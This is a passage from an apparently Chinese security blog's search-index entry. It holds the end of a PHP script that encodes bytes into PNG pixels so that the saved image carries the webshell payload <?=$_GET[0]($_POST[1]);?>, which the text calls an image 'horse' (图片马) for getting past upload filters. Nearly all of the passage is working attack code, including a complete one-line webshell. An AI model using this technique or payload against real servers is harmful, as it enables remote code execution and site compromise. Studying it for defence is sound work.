number">0xa1</span><span class="token punctuation">,</span>    <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string">'./1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>会生成一个含有<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>的png图片马</p><p><img src="https://i.loli.net/2020/12/22/5UNkGDFlqQVbipK.png" alt="image-20201222141356058"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
